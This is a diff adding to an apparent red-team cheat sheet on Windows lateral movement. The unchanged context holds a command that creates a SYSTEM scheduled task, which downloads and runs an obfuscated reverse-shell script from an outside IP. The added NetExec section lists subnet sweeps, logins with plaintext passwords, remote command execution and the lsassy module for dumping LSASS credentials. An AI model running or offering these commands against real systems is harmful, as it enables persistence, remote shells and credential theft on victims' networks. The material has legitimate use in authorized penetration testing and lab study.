@@ -40,3 +40,12 @@ wmic /node:john.activebreach.io process call create "C:\Windows\System32\Windows
 invoke-command -computername john.activebreach.io -scriptblock {schtasks /create /SC minute /mo 1 /RU "NT Authority\SYSTEM" /TN "Persist" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.100:8080/Obfuscated_RevShell.ps1''')'"}
 
 ```
+
+### NetExec
+```
+netexec  smb 192.168.1.0/24
+netexec winrm authority.htb -u svc_pwm -p 'pWm_@dm!N_!23'
+netexec  192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoam
+netexec  192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
+netexec smb serveur.whiteflag.local -u Administrateur -p Defte@WF -M lsassy
+```
